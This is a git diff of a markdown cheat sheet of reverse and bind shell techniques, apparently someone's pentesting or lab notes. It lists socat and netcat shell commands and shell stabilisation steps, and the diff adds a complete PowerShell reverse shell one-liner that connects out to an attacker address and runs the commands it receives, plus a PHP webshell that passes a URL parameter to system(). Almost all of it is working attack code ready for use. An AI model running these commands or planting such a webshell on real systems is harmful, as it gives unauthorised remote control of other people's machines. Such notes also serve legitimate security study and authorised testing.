@@ -564,15 +564,26 @@ Reverse and Bind shells are an essential technique for gaining remote code execu
 |Linux||1. `socat TCP-L:<port> -`|2. `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`|You get a reverse shell with Socat|
 |Linux||2. `socat TCP:<TARGET-IP>:<TARGET-PORT> -`|1. `socat TCP-L:<PORT> EXEC:”bash -li”`|You get a bind shel with Socat|
 |Linux||1. `socat TCP-L:<port> FILE:`tty`,raw,echo=0`|2. `socat TCP:<attacker-ip>:<attacker-port> EXEC:”bash -li”,pty,stderr,sigint,setsid,sane`|You get a fully stable reverse shell with Socat|
+|Windows|Create a webshell with the windows script below|1. `nc -lvnp 12345`|2. Look down ||
 
 
 
 
-or*: poner un | en lugar de or: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+- or*: poner un | en lugar de or: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+- Windows target's part: ``powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+
 ## Commands for stabilizing shell
 
 1. `python -c 'import pty;pty.spawn("/bin/bash")'`
 2. `export TERM=xterm`
 3. Background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`
 
+## Windows simple Webshell script
 
+```php
+<?php   
+    if(isset($_GET[‘cmd’])) {   
+        system($_GET[‘cmd’]);   
+    }  
+?>
+```
